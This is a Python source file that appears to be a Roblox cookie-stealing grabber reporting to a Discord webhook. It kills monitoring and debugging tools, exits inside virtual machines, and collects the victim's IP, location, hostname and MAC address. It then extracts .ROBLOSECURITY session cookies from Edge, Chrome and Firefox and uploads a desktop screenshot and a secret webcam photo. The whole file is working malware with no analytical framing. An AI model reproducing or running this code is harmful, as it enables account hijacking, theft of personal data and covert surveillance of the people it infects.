import os,requests,socket,threading,platform,json,psutil,sys,win32api
import browser_cookie3
import cv2
import re, uuid
from pystyle import *
from PIL import ImageGrab
os.system('cls')
webhook = "inputtedHook"
print("attempting to disable adrians antivirus... wait like 5 seconds")
process = [
    "ProcessHacker.exe",
    "httpdebuggerui.exe",
    "wireshark.exe",
    "HttpAnalyzerV7.exe",
    "fiddler.exe",
    "taskmgr.psutilexe,"
    "regedit.exe",
    "cmd.exe",
    "taskmgr.exe",
    "vboxservice.exe",
    "ollydbg.exe",
    "dnSpy.exe",
    "procexp64.exe",
    "procexp.exe"
]
for proc in psutil.process_iter():
    if proc.name() in process:
        proc.kill()

vm = ["VMwareService.exe", "VMwareTray.exe","joeboxcontrol.exe","vmwareuser.exe"]
for proc in psutil.process_iter():
        if proc.name() in vm:
            exit()
minDiskSizeGB = 50
if len(sys.argv) > 1: minDiskSizeGB = float(sys.argv[1])
_, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()
diskSizeGB = diskSizeBytes/1073741824

if diskSizeGB < minDiskSizeGB:
    try:

        embedss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/1023536716306452511/1024041873385463839/th.png",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/1023536716306452511/1024041873385463839/th.png"
                    },
                    "description": f"```VM detected, no info available.```",                       
                }
            ]

        }
        requests.post(webhook, json=embedss) 
        os._exit(1)
    except:
        pass
machines = platform.uname()
hostnames = socket.gethostname()  
ips = requests.get('https://api.ipify.org').text
info = requests.get("http://ipinfo.io/json").json()
city = info['city']
hostname = info['hostname']
country = info['country']
region = info['region']
lang = info['loc']
post = info['postal']
timezone = info['timezone']
org = info['org']
pc_username = os.getenv("UserName")
ip = socket.gethostbyname(hostname) 
embed = {
            "avatar_url":"https://cdn.discordapp.com/attachments/1023536716306452511/1024041873385463839/th.png",
            "embeds": [
                {
                    "author": {
                        "name": "bobux",

                        "icon_url": "https://cdn.discordapp.com/attachments/1023536716306452511/1024041873385463839/th.png"
                    },
                    "description": f" @everyone we got one  ```IP: {ips}``` ```City: {city}``` ```Country: {country}``` ```Region: {region}``` ```Language: {lang}```  ```Approx. Postal Code: {post}``` ```Organzation: {org}```   ```Hostname: {hostname}```  ```PC IP:{ip}``` ```PC Username: {pc_username}``` ```PC Hostname: {hostnames}``` ```PC Machine Name: {machines.machine}``` ```PC Processor: {machines.processor}``` ```MAC Address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}```",
                }
            ]
        }
requests.post(webhook, json=embed) 
def edge():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie})
        if info.status_code == 200:
            information = json.loads(info.text)
            username = information['UserName']
            id = information["UserID"]
            balance = information["RobuxBalance"]
            premium = information["IsPremium"]
            image = information["ThumbnailUrl"]
            embedss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/1023536716306452511/1024041873385463839/th.png",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/1023536716306452511/1024041873385463839/th.png"
                    },
                    "description": f"```Roblox Cookie: {cookie}``` Info ```Username: {username}``` ```Roblox ID : {id}``` ```Robux Balance : {balance}```  ```Premium Status: {premium}```  ```Thumbnail : {image}```",                       
                    "footer": {
                      "text": "bobux"
                    }
                }
            ]

        }
        requests.post(webhook, json=embedss) 
    except:
         embedssa = {
          "avatar_url":"https://cdn.discordapp.com/attachments/1023536716306452511/1024041873385463839/th.png",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/1023536716306452511/1024041873385463839/th.png"
                    },
                    "description": f"```Cookie not found (Edge)```",                      
                }
            ]

        }
         requests.post(webhook, json=embedssa) 
def chromes():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie})
        if info.status_code == 200:
            information = json.loads(info.text)
            username = information['UserName']
            id = information["UserID"]
            balance = information["RobuxBalance"]
            premium = information["IsPremium"]
            image = information["ThumbnailUrl"]
            embedss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/1023536716306452511/1024041873385463839/th.png",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/1023536716306452511/1024041873385463839/th.png"
                    },
                    "description": f"```Roblox Cookie:{cookie}```Info ```Username: {username}``` ```Roblox ID: {id}``` ```Robux Balance: {balance}```  ```Premium Status: {premium}```  ```Thumbnail: {image}```",                       
                    "footer": {
                      "text": "bobux"
                    }
                }
            ]

        }
        requests.post(webhook, json=embedss) 
    except:
         embedsss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/1023536716306452511/1024041873385463839/th.png",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/1023536716306452511/1024041873385463839/th.png"
                    },
                    "description": f"```Cookie not found (Chrome)```",                      
                }
            ]

        }
         requests.post(webhook, json=embedsss) 
         pass
def firefoxs():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie})
        if info.status_code == 200:
            information = json.loads(info.text)
            username = information['UserName']
            id = information["UserID"]
            balance = information["RobuxBalance"]
            premium = information["IsPremium"]
            image = information["ThumbnailUrl"]
            embedss = {
          "avatar_url":"https://cdn.discordapp.com/attachments/1023536716306452511/1024041873385463839/th.png",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/1023536716306452511/1024041873385463839/th.png"
                    },
                    "description": f"```Roblox Cookie:{cookie}```Info ```Username: {username}``` ```Account ID: {id}``` ```Robux Balance: {balance}```  ```Premium Status: {premium}```  ```Thumbnail: {image}```",                       
                    "footer": {
                      "text": "bobux"
                    }
                }
            ]

        }
        requests.post(webhook, json=embedss) 
    except:
         embeded = {
          "avatar_url":"https://cdn.discordapp.com/attachments/1023536716306452511/1024041873385463839/th.png",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/1023536716306452511/1024041873385463839/th.png"
                    },
                    "description": f"```Cookie not found (Firefox)```",                      
                }
            ]

        }
         requests.post(webhook, json=embeded) 
         pass

browsers = [firefoxs,edge,chromes]
for i in browsers:
  threading.Thread(target=i,).start()
pass
screenshot = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
screenshot.save("image.png")
screenshot.close()
with open('image.png', 'rb') as f:
     requests.post(webhook,files={'upload_file': f})
os.remove('image.png')
try:
            videoCaptureObject = cv2.VideoCapture(0)
            ret,frame = videoCaptureObject.read()
            cv2.imwrite("photo.png",frame)
            result = False
            with open('photo.png', 'rb') as f:
                requests.post(webhook,json={'content': f'Webcam image:'})
                requests.post(webhook,files={'upload_file': f})
            os.remove('photo.png')
except:
         embeded = {
          "avatar_url":"https://cdn.discordapp.com/attachments/1023536716306452511/1024041873385463839/th.png",
                      "embeds": [
                {
                    "author": {
                    "icon_url": "https://cdn.discordapp.com/attachments/1023536716306452511/1024041873385463839/th.png"
                    },
                    "description": f"```No webcam detected.```",                      
                }
            ]

        }
         requests.post(webhook, json=embeded) 
         pass
